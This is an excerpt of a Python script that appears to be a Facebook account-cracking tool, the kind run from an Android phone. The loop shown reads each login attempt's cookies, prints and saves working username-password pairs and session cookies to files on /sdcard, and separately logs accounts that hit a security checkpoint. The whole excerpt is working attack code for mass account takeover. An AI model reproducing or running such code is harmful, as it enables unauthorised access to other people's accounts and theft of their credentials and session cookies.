...
#-------------------------- header ----------------------------------- #
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[Ax-OK💚] ' +uid+ ' | ' +ps+    '  \n[‎‎😍]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/Ax10-OK.txt', 'a').write( uid+' | '+ps+'\y')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;30m[Ax-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/Ax10-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}Ax{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
